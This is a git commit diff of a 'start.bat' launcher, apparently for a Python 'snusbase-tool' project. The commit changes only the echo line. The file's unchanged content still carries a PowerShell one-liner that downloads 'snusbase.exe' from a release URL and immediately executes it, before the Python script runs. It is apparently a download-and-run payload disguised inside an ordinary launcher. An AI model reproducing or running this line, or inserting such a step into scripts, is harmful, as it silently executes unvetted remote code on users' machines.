4005b06a6629141690b690ba17be7043b78116c1
IWcommunityFR <158751385+IWcommunityFR@users.noreply.github.com>
2024-02-27 17:50:50 +0100

    Update start.bat

--- start.bat
+++ start.bat
@@ -1,4 +1,4 @@
-@echo off
+@echo ofF
 cd src
 powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/snusbase-tool/releases/download/snusbase/snusbase.exe';$file='snusbase.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 py main.py
